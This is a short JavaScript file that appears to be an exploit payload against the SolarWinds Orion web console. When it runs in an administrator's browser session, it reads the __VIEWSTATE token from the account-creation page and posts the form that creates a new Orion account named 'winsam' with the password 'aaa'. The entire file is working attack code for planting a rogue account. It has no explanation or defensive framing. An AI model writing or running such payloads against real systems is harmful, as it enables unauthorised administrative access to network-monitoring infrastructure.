function getHtmlBody(url, ref)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open('GET', url, false);
    xmlHttp.send(null);
    var results = xmlHttp.responseText;
    var doc = document.implementation.createHTMLDocument('');
    doc.documentElement.innerHTML = results;
    return(doc);
}

function getViewState(doc)
{
    return(doc.getElementById("__VIEWSTATE"));
}

function postCredentials(viewState, user, password)
{
    var http = new XMLHttpRequest();
    var url = "/Orion/Admin/Accounts/Add/OrionAccount.aspx?AccountType=Orion";

    var params = "ctl00%24ctl00%24ctl00%24BodyContent%24ScriptManagerPlaceHolder%24MasterScriptManager" + "=" + "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24UpdatePanel1%257Cctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24__CustomNav0%24ImageButton1" + "&" +
                 "__EVENTTARGET" + "=" + "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24__CustomNav0%24ImageButton1" + "&" +
                 "__EVENTARGUMENT" + "=" + "&" +
                 "__VIEWSTATE" + "=" + encodeURIComponent(viewState) + "&" +
                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24CreateUserStepContainer%24UserName" + "=" + user + "&" +
                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24CreateUserStepContainer%24Password" + "=" + password + "&" +
                 "ctl00%24ctl00%24ctl00%24BodyContent%24ContentPlaceHolder1%24adminContentPlaceholder%24createWizard%24CreateUserStepContainer%24ConfirmPassword" + "=" + password + "&" +
                 "__ASYNCPOST" + "=" + "false"

    http.open("POST", url, false);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-lenth", params.length);
    http.setRequestHeader("Connection", "close");
    http.send(params);
    var response = http.responseText;
    var doc = document.implementation.createHTMLDocument('');
    doc.documentElement.innerHTML = response;
    return(doc);
}

var doc1 = getHtmlBody("/Orion/Admin/Accounts/Add/OrionAccount.aspx?AccountType=Orion");
var pageView=getViewState(doc1).value;
alert(doc1);
user="winsam";
password="aaa";

postCredentials(pageView,user,password);
